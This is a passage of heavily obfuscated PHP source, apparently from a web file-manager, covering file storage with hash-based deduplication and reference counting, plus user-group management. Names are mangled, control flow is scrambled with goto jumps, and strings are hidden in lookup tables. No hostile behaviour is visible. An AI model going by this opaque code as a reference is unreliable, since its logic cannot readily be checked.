$fÕİ›ßáà); $A¶Œ¹Ç­ƒ = $AÊËóÎ­ . $c‡¡àÁï‘ñ; goto BÓí–‡æÛ®; f’‰äÄî÷È: case $DŠ¡ÓÚœ’‹[1702]: break; default: break; } return $A¶Œ¹Ç­ƒ; goto dåÖô—²ë†; BÑ›Á—Ñ: $A¶Œ¹Ç­ƒ = $AÊËóÎ­ . rand_string(5) . short_id(100); $fÕİ›ßáà = str_replace($DŠ¡ÓÚœ’‹[8], $DŠ¡ÓÚœ’‹[70], KodIO::clear($fÕİ›ßáà)); if (!$fÕİ›ßáà) { $BØ‰éŠŠ“« = $DŠ¡ÓÚœ’‹[1702]; } goto Fë¾ËŒ…ˆ; dåÖô—²ë†: } public function addFileByRemote($BÂ½ï¾Ù‘, $dÄ©æ†±‘, $E®¯Äªöæß = array()) { goto f‘ºÍ·“Ø; EÃôƒŞíëÀ: $CÔä…±ºÃá = IO::hashMd5($BÂ½ï¾Ù‘, $aºçƒ®¬Ë); $cè¦‚“¸ÓÑ = KodIO::defaultDriver(); $C³ìµÛç = array($AœßŸëİ¯¿[537] => IO::size($BÂ½ï¾Ù‘), $AœßŸëİ¯¿[1710] => 1, $AœßŸëİ¯¿[402] => $dÄ©æ†±‘, $AœßŸëİ¯¿[743] => $cè¦‚“¸ÓÑ[$AœßŸëİ¯¿[383]], $AœßŸëİ¯¿[403] => $BÂ½ï¾Ù‘, $AœßŸëİ¯¿[1711] => $E®¯Äªöæß[$AœßŸëİ¯¿[168]] ? $E®¯Äªöæß[$AœßŸëİ¯¿[168]] : IO::hashSimple($BÂ½ï¾Ù‘), $AœßŸëİ¯¿[1712] => $CÔä…±ºÃá ? $CÔä…±ºÃá : $aºçƒ®¬Ë); goto c„¥«ŒÔ«‘; c„¥«ŒÔ«‘: if ($d‚«Ïº‘è• = $this->addFileCheckExist($C³ìµÛç[$AœßŸëİ¯¿[168]], $C³ìµÛç[$AœßŸëİ¯¿[167]], $C³ìµÛç[$AœßŸëİ¯¿[77]])) { return $d‚«Ïº‘è•; } return $this->addFileData($C³ìµÛç); goto céóìğï®±; f‘ºÍ·“Ø: $AœßŸëİ¯¿ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!IO::exist($BÂ½ï¾Ù‘)) { return !1; } $aºçƒ®¬Ë = $E®¯Äªöæß[$AœßŸëİ¯¿[167]] ? $E®¯Äªöæß[$AœßŸëİ¯¿[167]] : $AœßŸëİ¯¿[33]; goto EÃôƒŞíëÀ; céóìğï®±: } private function addFileData($f²ÃÈ÷¼ç) { $eÈ†´¬ˆ§ê =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$f²ÃÈ÷¼ç) { return !1; } $f²ÃÈ÷¼ç[$eÈ†´¬ˆ§ê[77]] = intval($f²ÃÈ÷¼ç[$eÈ†´¬ˆ§ê[77]]); if (!$f²ÃÈ÷¼ç[$eÈ†´¬ˆ§ê[77]] && strlen($f²ÃÈ÷¼ç[$eÈ†´¬ˆ§ê[168]]) > 32) { $f²ÃÈ÷¼ç[$eÈ†´¬ˆ§ê[77]] = intval(substr($f²ÃÈ÷¼ç[$eÈ†´¬ˆ§ê[168]], 32)); } $c—•‚»·õÊ = $this->add($f²ÃÈ÷¼ç); return $this->find($c—•‚»·õÊ); } public function addFile($CãàÓõ£Ğè, $C¤¦ğ¼‰ŸÃ, $D¿ÒÎ¨¼âô = false) { goto FĞïäî½Ûˆ; eê¤Êƒ£–ß: $e²Íƒ…İã = $_SERVER[ÈİÅ¿ÈÈ¥×][1713] . $c½“²íè–Æ; CacheLock::lock($e²Íƒ…İã); if ($f¬ïê†¥Öµ = $this->addFileCheckExist($c—Ü‰ŒĞÆñ, $c½“²íè–Æ, $A ¸ƒŸòÚ‘)) { CacheLock::unlock($e²Íƒ…İã); return $f¬ïê†¥Öµ; } goto Cá¼õÍáÙä; FĞïäî½Ûˆ: $c—Ü‰ŒĞÆñ = IO::hashSimple($CãàÓõ£Ğè); $c½“²íè–Æ = IO::hashMd5($CãàÓõ£Ğè); $A ¸ƒŸòÚ‘ = IO::size($CãàÓõ£Ğè); goto eê¤Êƒ£–ß; Cá¼õÍáÙä: $F§ÎŒ¤—Òù = $this->addFileMake($CãàÓõ£Ğè, $A ¸ƒŸòÚ‘, $c—Ü‰ŒĞÆñ, $c½“²íè–Æ, $C¤¦ğ¼‰ŸÃ, $D¿ÒÎ¨¼âô); $CÌÚ†Ùïß‰ = $this->addFileData($F§ÎŒ¤—Òù); CacheLock::unlock($e²Íƒ…İã); goto e·ˆ´šØŞ¾; e·ˆ´šØŞ¾: return $CÌÚ†Ùïß‰; goto b¦‹†Ì´‰Ğ; b¦‹†Ì´‰Ğ: } public function addFileMake($D¼Š¹…ê»», $AÎ²’¤‹ß, $b‹ÁùÑ¥†Ê, $e•¤†Õ•í, $A¢—Ï¿—È·, $d‘¢“×Çí”) { goto BôÜ²œª¼; BôÜ²œª¼: $cäåÜÊ¤©¿ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C³¿Öåæ¤Ê = $this->createFileName($A¢—Ï¿—È·); $BÛĞ‚¿¢ = get_path_father($C³¿Öåæ¤Ê); goto a³ÔªÉ‘ÓÇ; a³ÔªÉ‘ÓÇ: $bØê” Ìé» = get_path_this($C³¿Öåæ¤Ê); if ($d‘¢“×Çí”) { $a¨´òÑ‘Éİ = IO::move($D¼Š¹…ê»», $BÛĞ‚¿¢, !1, $bØê” Ìé»); } else { $a¨´òÑ‘Éİ = IO::copy($D¼Š¹…ê»», $BÛĞ‚¿¢, !1, $bØê” Ìé»); } if (!$a¨´òÑ‘Éİ) { return !1; } goto f¤®»¢àØ®; f¤®»¢àØ®: $E‚­ÃÑ¥¤ = KodIO::defaultDriver(); $F‹£ô¯÷ºå = array($cäåÜÊ¤©¿[537] => $AÎ²’¤‹ß, $cäåÜÊ¤©¿[1710] => 1, $cäåÜÊ¤©¿[402] => $A¢—Ï¿—È·, $cäåÜÊ¤©¿[743] => $E‚­ÃÑ¥¤[$cäåÜÊ¤©¿[383]], $cäåÜÊ¤©¿[403] => $C³¿Öåæ¤Ê, $cäåÜÊ¤©¿[1711] => $b‹ÁùÑ¥†Ê, $cäåÜÊ¤©¿[1712] => $e•¤†Õ•í); return $F‹£ô¯÷ºå; goto eÖñ˜Ï‘Ç×; eÖñ˜Ï‘Ç×: } public function addFileCheckExist($E¦È•Á²¯, $D„õù™Ç¿Á, $f†„À˜»˜Û) { $DÀí×µ¿ù¦ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Fø‡¹®¡· = $this->findByHash($E¦È•Á²¯, $D„õù™Ç¿Á); if (!$Fø‡¹®¡·) { return !1; } $CîÛ¸ë½¢ = array($DÀí×µ¿ù¦[1710] => intval($Fø‡¹®¡·[$DÀí×µ¿ù¦[1714]]) + 1, $DÀí×µ¿ù¦[537] => $f†„À˜»˜Û); $this->where(array($DÀí×µ¿ù¦[436] => $Fø‡¹®¡·[$DÀí×µ¿ù¦[435]]))->save($CîÛ¸ë½¢); return $Fø‡¹®¡·; } public function remove($EŒ”¨íÙšŠ) { $this->linkCountChange($EŒ”¨íÙšŠ, !1); $this->clearEmpty(); return !0; } public function linkAdd($fƒİˆ®†‰‚) { $this->linkCountChange($fƒİˆ®†‰‚, !0); } public function linkCountChange($d–²Í‚•ó, $aôÉå…Ã) { goto BäæÄ˜ÉóŠ; BäæÄ˜ÉóŠ: $FÍêÍ‘Åï† =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$d–²Í‚•ó) { return; } if (!is_array($d–²Í‚•ó)) { $d–²Í‚•ó = array($d–²Í‚•ó); } goto fëÈ ¡«íÁ; E‹ÕÉÅê™: foreach ($aŸ…ƒÚ¸ÆÏ as $D“Òõ›·˜· => $d²­ÌÁªÉ) { $dèØÕÕ’ƒ = $d²­ÌÁªÉ . $FÍêÍ‘Åï†[33]; if (!$aÉÉÉƒä[$dèØÕÕ’ƒ]) { $aÉÉÉƒä[$dèØÕÕ’ƒ] = array(); } $aÉÉÉƒä[$dèØÕÕ’ƒ][] = $D“Òõ›·˜·; } foreach ($aÉÉÉƒä as $d²­ÌÁªÉ => $b¬…ŞÎóŒ) { if (!$b¬…ŞÎóŒ) { continue; } $d²­ÌÁªÉ = $aôÉå…Ã ? $d²­ÌÁªÉ : -intval($d²­ÌÁªÉ); $BŞé†µ¿˜Í = array($FÍêÍ‘Åï†[435] => array($FÍêÍ‘Åï†[7], $b¬…ŞÎóŒ)); if ($d²­ÌÁªÉ < 0) { $BŞé†µ¿˜Í[$FÍêÍ‘Åï†[1714]] = array($FÍêÍ‘Åï†[937], abs($d²­ÌÁªÉ)); } $this->where($BŞé†µ¿˜Í)->setAdd($FÍêÍ‘Åï†[1714], $d²­ÌÁªÉ); } goto d¯İ„¦İó; fëÈ ¡«íÁ: $aŸ…ƒÚ¸ÆÏ = array(); foreach ($d–²Í‚•ó as $D“Òõ›·˜·) { $dèØÕÕ’ƒ = $D“Òõ›·˜· . $FÍêÍ‘Åï†[33]; if (!$aŸ…ƒÚ¸ÆÏ[$dèØÕÕ’ƒ]) { $aŸ…ƒÚ¸ÆÏ[$dèØÕÕ’ƒ] = 0; } $aŸ…ƒÚ¸ÆÏ[$dèØÕÕ’ƒ]++; } $aÉÉÉƒä = array(); goto E‹ÕÉÅê™; d¯İ„¦İó: } public function findByHash($CŒ‰©³ë­, $b¾ÉŞÍñ² = false) { $fãÛŸÌ¦ÒÕ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$CŒ‰©³ë­ && !$b¾ÉŞÍñ²) { return !1; } $b×Ë¨—íöé = array($fãÛŸÌ¦ÒÕ[1711] => $CŒ‰©³ë­); if ($b¾ÉŞÍñ²) { $b×Ë¨—íöé = array($fãÛŸÌ¦ÒÕ[1712] => $b¾ÉŞÍñ²); } return $this->order($fãÛŸÌ¦ÒÕ[1715])->where($b×Ë¨—íöé)->find(); } public function clearEmpty($B¿ˆËÈ¡Õæ = 0) { goto bŒªæéÍÔ®; bŒªæéÍÔ®: $Cìñ·éÁá„ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dè¬ÈŸäø  = time() - 3600 * 24 * $B¿ˆËÈ¡Õæ; $CÊ„Ü·®ŠÃ = $Cìñ·éÁá„[1716] . $dè¬ÈŸäø ; goto Fà¾ãî”è; e†¥ˆÖ¾ô³: foreach ($F¬®„ƒ©ÆÁ as $D¾ùĞ¡ã£è) { $C’ßÓï¹¤->update(1); $this->resetFile($D¾ùĞ¡ã£è); } $C’ßÓï¹¤->end(); goto cùÇğ‚¶¥”; Fà¾ãî”è: $F¬®„ƒ©ÆÁ = $this->where($CÊ„Ü·®ŠÃ)->select(); if (!$F¬®„ƒ©ÆÁ) { return; } $C’ßÓï¹¤ = new Task($Cìñ·éÁá„[1717], $Cìñ·éÁá„[33], count($F¬®„ƒ©ÆÁ)); goto e†¥ˆÖ¾ô³; cùÇğ‚¶¥”: } public function resetFile($b†‹äã·ß) { goto EÆ®ºğÛŒ‰; EÆ®ºğÛŒ‰: $eË«áåéø¤ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B±ß¼í¢’Ì = array($eË«áåéø¤[436] => $b†‹äã·ß[$eË«áåéø¤[435]]); $Fİ†ìéõ×í = Model($eË«áåéø¤[1167])->where($B±ß¼í¢’Ì)->count(); goto E¢öÓ®Ã¸â; E¢öÓ®Ã¸â: $cê’ß«îãÂ = Model($eË«áåéø¤[1718])->where($B±ß¼í¢’Ì)->count(); $bŒˆ«ÈÅ‚Î = intval($Fİ†ìéõ×í) + intval($cê’ß«îãÂ); if ($bŒˆ«ÈÅ‚Î == 0) { IO::remove($b†‹äã·ß[$eË«áåéø¤[75]]); $this->where($B±ß¼í¢’Ì)->delete(); $this->metaSet($b†‹äã·ß[$eË«áåéø¤[435]], null, null); return; } goto BŒêé¤Â¢Ê; BŒêé¤Â¢Ê: if ($b†‹äã·ß[$eË«áåéø¤[1714]] != $bŒˆ«ÈÅ‚Î) { $this->where($B±ß¼í¢’Ì)->save(array($eË«áåéø¤[1710] => $bŒˆ«ÈÅ‚Î)); } goto aåÎ°ÌÕ¼Ü; aåÎ°ÌÕ¼Ü: } public function storageInfo($e¡É¶Ã‘èÌ = false) { goto D÷Â½ôˆèÁ; BóÕ¦»ª¸: $A¼™óïÇá« = 1; $FÏ»ğ§óöã = 0; $aº²éÕÛÚ– = 5000; goto DĞ¼¶·»È–; DĞ¼¶·»È–: for ($cÃïÓàÛ = 0; $cÃïÓàÛ < $c·ö§ ®¾; $cÃïÓàÛ = $cÃïÓàÛ + $aº²éÕÛÚ–) { $B‰÷ÚíšÑ = $this->limit($cÃïÓàÛ, $cÃïÓàÛ + $aº²éÕÛÚ–)->select(); foreach ($B‰÷ÚíšÑ as $c»‹š¿İçí) { $A¼™óïÇá« += $c»‹š¿İçí[$b½¾†ªÎ[77]] * $c»‹š¿İçí[$b½¾†ªÎ[1714]]; $EÅÁÚù„ãÄ += $c»‹š¿İçí[$b½¾†ªÎ[77]] * ($c»‹š¿İçí[$b½¾†ªÎ[1714]] - 1); $FÏ»ğ§óöã += $c»‹š¿İçí[$b½¾†ªÎ[1714]]; } } $A×¯İå‰Ö = array($b½¾†ªÎ[1719] => $A¼™óïÇá«, $b½¾†ªÎ[1720] => $EÅÁÚù„ãÄ, $b½¾†ªÎ[1721] => $EÅÁÚù„ãÄ / $A¼™óïÇá«, $b½¾†ªÎ[81] => $c·ö§ ®¾, $b½¾†ªÎ[1722] => $FÏ»ğ§óöã); return $A×¯İå‰Ö; goto AŸ°Ø¹êºš; D÷Â½ôˆèÁ: $b½¾†ªÎ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c·ö§ ®¾ = $this->count() + 0.0; $EÅÁÚù„ãÄ = 0; goto BóÕ¦»ª¸; AŸ°Ø¹êºš: } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\165\160"; protected $tableMeta = array("\x74\x61\x62\154\145\116\141\155\x65" => "\147\x72\157\165\x70\x5f\x6d\x65\x74\141", "\x6d\145\x74\141\x46\151\x65\154\144" => "\147\162\x6f\x75\x70\x49\x44"); protected function cacheFunctionAlias($Eª¯Ìë„™) { $DÊ°›Ï·ùº =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return array($DÊ°›Ï·ùº[1723] => array($Eª¯Ìë„™[0], $DÊ°›Ï·ùº[1724]), $DÊ°›Ï·ùº[1725] => array($Eª¯Ìë„™[0], $DÊ°›Ï·ùº[1724])); } protected function getInfo($Cİ¹òğ›Šì) { $fÜâÎ½‰ŞÀ = $this->getInfoSimple($Cİ¹òğ›Šì); if (!$fÜâÎ½‰ŞÀ) { return !1; } return $this->_listDataApplyItem($fÜâÎ½‰ŞÀ); } protected function getInfoSimple($D´ƒßèŸ¾¡, $AáÒ“¤³—¡ = false) { $d¨¿’Ÿ¨œ¥ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($AáÒ“¤³—¡) { $aÎÙÛäÌ–Ô = array($d¨¿’Ÿ¨œ¥[1650] => intval($D´ƒßèŸ¾¡)); $cÅ¡ïÒ…ñ– = $this->where($aÎÙÛäÌ–Ô)->find(); return is_array($cÅ¡ïÒ…ñ–) ? $cÅ¡ïÒ…ñ– : array(); } return $this->cacheFunctionGet($d¨¿’Ÿ¨œ¥[1726], $D´ƒßèŸ¾¡); } protected function groupAdd($b¤ÖÇ©öá½) { goto b‚É—Æ„òˆ; c…æ¥ÁäÏ»: if (isset($b¤ÖÇ©öá½[$fâÎÏ’Îíï[1729]])) { $this->metaSet($B†‡ñç·Ù­, array($fâÎÏ’Îíï[1729] => $b¤ÖÇ©öá½[$fâÎÏ’Îíï[1729]], $fâÎÏ’Îíï[1730] => $b¤ÖÇ©öá½[$fâÎÏ’Îíï[1730]])); unset($b¤ÖÇ©öá½[$fâÎÏ’Îíï[1729]]); unset($b¤ÖÇ©öá½[$fâÎÏ’Îíï[1730]]); } Model($fâÎÏ’Îíï[1167])->groupRootAdd($B†‡ñç·Ù­); return $B†‡ñç·Ù­; goto e¡¸ÙÈí¾Ç; D¨§ÒàÏ•±: if ($EˆŒ²ìø¹ˆ[$fâÎÏ’Îíï[476]]) { $eÕò‰¼ßî = $EˆŒ²ìø¹ˆ[$fâÎÏ’Îíï[476]] . $EˆŒ²ìø¹ˆ[$fâÎÏ’Îíï[1650]] . $fâÎÏ’Îíï[47]; } $A­°ŒèƒºÀ = array($fâÎÏ’Îíï[402] => $this->groupNameAuto($b¤ÖÇ©öá½[$fâÎÏ’Îíï[478]], $b¤ÖÇ©öá½[$fâÎÏ’Îíï[28]]), $fâÎÏ’Îíï[384] => $b¤ÖÇ©öá½[$fâÎÏ’Îíï[478]], $fâÎÏ’Îíï[542] => $eÕò‰¼ßî, $fâÎÏ’Îíï[1727] => $b¤ÖÇ©öá½[$fâÎÏ’Îíï[1634]], $fâÎÏ’Îíï[1728] => 0, $fâÎÏ’Îíï[1654] => 0); if (isset($b¤ÖÇ©öá½[$fâÎÏ’Îíï[1673]])) { $A­°ŒèƒºÀ[$fâÎÏ’Îíï[1673]] = $b¤ÖÇ©öá½[$fâÎÏ’Îíï[1673]]; } else { $E˜«ô£×µ = $this->max($fâÎÏ’Îíï[1673]); if (!$E˜«ô£×µ) { $E˜«ô£×µ = 0; } $A­°ŒèƒºÀ[$fâÎÏ’Îíï[1673]] = $E˜«ô£×µ + 1; } goto Bšö¿ÌÈ³‘; Bšö¿ÌÈ³‘: if (!empty($b¤ÖÇ©öá½[$fâÎÏ’Îíï[1650]])) { $A­°ŒèƒºÀ[$fâÎÏ’Îíï[1650]] = $b¤ÖÇ©öá½[$fâÎÏ’Îíï[1650]]; } $B†‡ñç·Ù­ = $this->add($A­°ŒèƒºÀ); $this->setNamePinyin($B†‡ñç·Ù­, $A­°ŒèƒºÀ[$fâÎÏ’Îíï[28]]); goto c…æ¥ÁäÏ»; b‚É—Æ„òˆ: $fâÎÏ’Îíï =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$b¤ÖÇ©öá½[$fâÎÏ’Îíï[478]] && isset($b¤ÖÇ©öá½[$fâÎÏ’Îíï[1650]]) && $b¤ÖÇ©öá½[$fâÎÏ’Îíï[1650]] == 1) { if ($EˆŒ²ìø¹ˆ = $this->getInfoSimple($b¤ÖÇ©öá½[$fâÎÏ’Îíï[1650]], !0)) { return $b¤ÖÇ©öá½[$fâÎÏ’Îíï[1650]]; } } else { $EˆŒ²ìø¹ˆ = $this->getInfoSimple($b¤ÖÇ©öá½[$fâÎÏ’Îíï[478]]); if (!$EˆŒ²ìø¹ˆ) { return !1; } } $eÕò‰¼ßî = $fâÎÏ’Îíï[487]; goto D¨§ÒàÏ•±; e¡¸ÙÈí¾Ç: } protected function groupEdit($E™í­ÒŞÉî, $A‹ŒÉôÙöñ) { $cÔ÷Ã“ïÀ¾ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!empty($A‹ŒÉôÙöñ[$cÔ÷Ã“ïÀ¾[478]])) { $eëÍ‰Š½¼ = $this->getInfoSimple($E™í­ÒŞÉî); $D—×¬â•ìÔ = $this->getInfoSimple($A‹ŒÉôÙöñ[$cÔ÷Ã“ïÀ¾[478]]); if (!$eëÍ‰Š½¼ || !$D—×¬â•ìÔ) { return !1; } if ($eëÍ‰Š½¼[$cÔ÷Ã“ïÀ¾[1650]] == $D—×¬â•ìÔ[$cÔ÷Ã“ïÀ¾[1650]]) { return !1; } if ($A‹ŒÉôÙöñ[$cÔ÷Ã“ïÀ¾[478]] != $eëÍ‰Š½¼[$cÔ÷Ã“ïÀ¾[478]]) { if ($D—×¬â•ìÔ[$cÔ÷Ã“ïÀ¾[476]] !== $eëÍ‰Š½¼[$cÔ÷Ã“ïÀ¾[476]] && strpos($D—×¬â•ìÔ[$cÔ÷Ã“ïÀ¾[476]], $eëÍ‰Š½¼[$cÔ÷Ã“ïÀ¾[476]] . $eëÍ‰Š½¼[$cÔ÷Ã“ïÀ¾[1650]] . $cÔ÷Ã“ïÀ¾[47]) === 0) { return !1; } $A‹ŒÉôÙöñ[$cÔ÷Ã“ïÀ¾[542]] = $D—×¬â•ìÔ[$cÔ÷Ã“ïÀ¾[476]] . $A‹ŒÉôÙöñ[$cÔ÷Ã“ïÀ¾[478]] . $cÔ÷Ã“ïÀ¾[47]; $this->_changeChildLevel($eëÍ‰Š½¼, $D—×¬â•ìÔ); } } if (isset($A‹ŒÉôÙöñ[$cÔ÷Ã“ïÀ¾[28]])) { $this->setNamePinyin($E™í­ÒŞÉî, $A‹ŒÉôÙöñ[$cÔ÷Ã“ïÀ¾[28]]); } if (isset($A‹ŒÉôÙöñ[$cÔ÷Ã“ïÀ¾[1729]])) { $this->metaSet($E™í­ÒŞÉî, array($cÔ÷Ã“ïÀ¾[1729] => $A‹ŒÉôÙöñ[$cÔ÷Ã“ïÀ¾[1729]], $cÔ÷Ã“ïÀ¾[1730] => $A‹ŒÉôÙöñ[$cÔ÷Ã“ïÀ¾[1730]])); unset($A‹ŒÉôÙöñ[$cÔ÷Ã“ïÀ¾[1729]]); unset($A‹ŒÉôÙöñ[$cÔ÷Ã“ïÀ¾[1730]]); } return $this->where(array($cÔ÷Ã“ïÀ¾[1731] => $E™í­ÒŞÉî))->save($A‹ŒÉôÙöñ); } private function _changeChildLevel($aš±„ÃĞŒâ, $fÃÉ šÔµİ, $A–÷Ô‰å = false) { goto aŠ±¶éâ×; f—–®·Í°î: if ($A–÷Ô‰å) { $BÓ„İñÖ = $fÃÉ šÔµİ[$bˆ½İÒïØÀ[476]] . $fÃÉ šÔµİ[$bˆ½İÒïØÀ[1650]] . $bˆ½İÒïØÀ[47]; } $aêêê„˜ãÔ = array($bˆ½İÒïØÀ[542] => array($bˆ½İÒïØÀ[500], $aš±„ÃĞŒâ[$bˆ½İÒïØÀ[476]] . $aš±„ÃĞŒâ[$bˆ½İÒïØÀ[1650]] . $bˆ½İÒïØÀ[501])); $d™„×§‘Ë = array($bˆ½İÒïØÀ[542] => array($bˆ½İÒïØÀ[550], "\162\145\x70\x6c\141\143\x65\x28\160\x61\162\x65\156\164\x4c\145\166\145\154\54\x27{$aÛğî­Æ¥Ã}\47\x2c\47{$BÓ„İñÖ}\47\51")); goto eËëÂ¼äÀƒ; eËëÂ¼äÀƒ: $this->where($aêêê„˜ãÔ)->data($d™„×§‘Ë)->save(); goto cÁ´ÁİĞ; aŠ±¶éâ×: $bˆ½İÒïØÀ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aÛğî­Æ¥Ã = $aš±„ÃĞŒâ[$bˆ½İÒïØÀ[476]] . $aš±„ÃĞŒâ[$bˆ½İÒïØÀ[1650]] . $bˆ½İÒïØÀ[47]; $BÓ„İñÖ = $fÃÉ šÔµİ[$bˆ½İÒïØÀ[476]] . $fÃÉ šÔµİ[$bˆ½İÒïØÀ[1650]] . $bˆ½İÒïØÀ[47] . $aš±„ÃĞŒâ[$bˆ½İÒïØÀ[1650]] . $bˆ½İÒïØÀ[47]; goto f—–®·Í°î; cÁ´ÁİĞ: } public function setNamePinyin($fåÆöí—äó, $bÈ‘ÔŠŒ = false) { $aÁ˜Ó’´’• =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$bÈ‘ÔŠŒ) { $b®ù±®Ú§‰ = $this->getInfoSimple($fåÆöí—äó); $bÈ‘ÔŠŒ = $b®ù±®Ú§‰[$aÁ˜Ó’´’•[28]]; } if (!Input::check($bÈ‘ÔŠŒ, $aÁ˜Ó’´’•[545])) { $this->metaSet($fåÆöí—äó, $aÁ˜Ó’´’•[432], null); $this->metaSet($fåÆöí—äó, $aÁ˜Ó’´’•[431], null); return; } $B¨´‹…¼•Û = array($aÁ˜Ó’´’•[432] => str_replace($aÁ˜Ó’´’•[50], $aÁ˜Ó’´’•[33], Pinyin::encode($bÈ‘ÔŠŒ)), $aÁ˜Ó’´’•[431] => Pinyin::encode($bÈ‘ÔŠŒ, $aÁ˜Ó’´’•[546])); $this->metaSet($fåÆöí—äó, $B¨´‹…¼•Û); } protected function groupStatus($cÉÜš•Ã®©, $AŒ›ŒÖ¿) { goto d½±Öç·; A›èğ‡óª¦: foreach ($d‹©’ãÈã² as $cÉÜš•Ã®©) { $AÒ—³â¶õ‘[] = array($bÊÊ¨Œ´Á¦[1650] => $cÉÜš•Ã®©, $bÊÊ¨Œ´Á¦[89] => $bÊÊ¨Œ´Á¦[697], $bÊÊ¨Œ´Á¦[366] => $AŒ›ŒÖ¿); } return Model($bÊÊ¨Œ´Á¦[1732])->addAll($AÒ—³â¶õ‘, array(), !0); goto F·Û”›…É; cõ©ç‚à¦ˆ: if ($AŒ›ŒÖ¿ == $bÊÊ¨Œ´Á¦[83]) { $d‹©’ãÈã² = $this->parentLevelArray($A°²’ÓİÌ[$bÊÊ¨Œ´Á¦[476]]); } else { $B÷áÔ†˜¢Á = array($bÊÊ¨Œ´Á¦[542] => array($bÊÊ¨Œ´Á¦[500], $A°²’ÓİÌ[$bÊÊ¨Œ´Á¦[476]] . $A°²’ÓİÌ[$bÊÊ¨Œ´Á¦[1650]] . $bÊÊ¨Œ´Á¦[501])); $d‹©’ãÈã² = $this->where($B÷áÔ†˜¢Á)->field($bÊÊ¨Œ´Á¦[1650])->select(); $d‹©’ãÈã² = array_to_keyvalue($d‹©’ãÈã², $bÊÊ¨Œ´Á¦[33], $bÊÊ¨Œ´Á¦[1650]); } $d‹©’ãÈã²[] = $A°²’ÓİÌ[$bÊÊ¨Œ´Á¦[1650]]; $AÒ—³â¶õ‘ = array(); goto A›èğ‡óª¦; d½±Öç·: $bÊÊ¨Œ´Á¦ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A°²’ÓİÌ = $this->getInfoSimple($cÉÜš•Ã®©); if (!$A°²’ÓİÌ) { return !1; } goto cõ©ç‚à¦ˆ; F·Û”›…É: } protected function groupRemove($D†Öš’šòˆ) { goto a•‹Øáº…Š; a•‹Øáº…Š: $C£šËâ‡ Ñ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c¬”Å¹ÏÔë = array($C£šËâ‡ Ñ[1650] => $D†Öš’šòˆ); $E¸Ÿ›¤±… = $this->where($c¬”Å¹ÏÔë)->find(); goto a…„ªæ¶ï¯; F«¨•²­º: $this->where(array($C£šËâ‡ Ñ[478] => $D†Öš’šòˆ))->save(array($C£šËâ‡ Ñ[478] => $E¸Ÿ›¤±…[$C£šËâ‡ Ñ[478]])); Model($C£šËâ‡ Ñ[1732])->where($c¬”Å¹ÏÔë)->delete(); Model($C£šËâ‡ Ñ[1733])->where($c¬”Å¹ÏÔë)->delete(); goto b¦Œ‘º‡Ü†; b¦Œ‘º‡Ü†: Model($C£šËâ‡ Ñ[759])->groupRootRemove($D†Öš’šòˆ); return $this->where($c¬”Å¹ÏÔë)->delete(); goto E¬ø¶…»à±; a…„ªæ¶ï¯: if (!$E¸Ÿ›¤±… || $E¸Ÿ›¤±…[$C£šËâ‡ Ñ[478]] == 0) { return !1; } $bøìø¿Á¡è = $this->getInfoSimple($E¸Ÿ›¤±…[$C£šËâ‡ Ñ[478]]); $this->_changeChildLevel($E¸Ÿ›¤±…, $bøìø¿Á¡è, !0); goto F«¨•²­º; E¬ø¶…»à±: } protected function groupSort($a¡µâ¤¼´) { $B¿»õ‡¦ä¶ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D‚Åç³ÊĞ = array(); foreach ($a¡µâ¤¼´ as $e«ŸŠÄ‡œÄ => $fÉ‘ÛÚƒŒÉ) { $D‚Åç³ÊĞ[] = array($B¿»õ‡¦ä¶[1650], $fÉ‘ÛÚƒŒÉ, $B¿»õ‡¦ä¶[1673], $e«ŸŠÄ‡œÄ + 1); } $this->saveAll($D‚Åç³ÊĞ); } public function listData() { $bÜ½šäÚÍ¡ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($bÜ½šäÚÍ¡[$_SERVER[ÈİÅ¿ÈÈ¥×][361]]); return $bÜ½šäÚÍ¡; } private function _makeOrder($FÏÄ¡æ×Â’ = '') { goto DîèòÏôÑ«; DîèòÏôÑ«: $A²ñ’È»™— =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $e•å«Œ » = array($A²ñ’È»™—[1650], $A²ñ’È»™—[28], $A²ñ’È»™—[1636], $A²ñ’È»™—[190]); $f™Œ£öêù‘ = array($A²ñ’È»™—[418] => $A²ñ’È»™—[419], $A²ñ’È»™—[420] => $A²ñ’È»™—[421]); goto FŒô¹öÔ±§; AÚ×•–»¢„: $FÏÄ¡æ×Â’ = $FÏÄ¡æ×Â’ . "{$aôÎö¡·ŠÒ}\40{$F‡ ·ØÙò¾}\54\40\x67\162\157\x75\x70\111\104\x20\x61\163\x63"; return $this->order($FÏÄ¡æ×Â’); goto B·“çæù; FŒô¹öÔ±§: $aôÎö¡·ŠÒ = Input::get($A²ñ’È»™—[423], $A²ñ’È»™—[7], $A²ñ’È»™—[1654], $e•å«Œ »); $F‡ ·ØÙò¾ = Input::get($A²ñ’È»™—[424], $A²ñ’È»™—[7], $A²ñ’È»™—[1734], array($A²ñ’È»™—[1734], $A²ñ’È»™—[420])); $F‡ ·ØÙò¾ = $f™Œ£öêù‘[$F‡ ·ØÙò¾]; goto AÚ×•–»¢„; B·“çæù: } public function listChild($b¾ˆÏË¦ãÖ) { $aÌ«ŸãíÁá =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cÁãÊÇë¼Ë = $this->where(array($aÌ«ŸãíÁá[478] => $b¾ˆÏË¦ãÖ))->_makeOrder()->selectPage(200); $this->_listDataApply($cÁãÊÇë¼Ë[$aÌ«ŸãíÁá[361]]); return $cÁãÊÇë¼Ë; } public function listByID($Eè¬Ê«·Îæ) { 